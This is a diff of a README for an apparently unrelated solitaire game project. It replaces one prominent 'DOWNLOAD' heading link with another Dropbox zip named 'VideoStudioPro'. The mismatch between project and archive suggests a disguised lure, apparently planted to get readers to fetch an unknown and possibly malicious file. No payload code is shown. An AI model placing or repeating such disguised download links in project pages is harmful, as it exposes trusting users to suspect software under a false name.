@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/5i88ippxq6pd929/VideoStudioPro%20for%20ADS.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/zjo5qmv8ai7bt3c/VideoStudioPro.zip?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
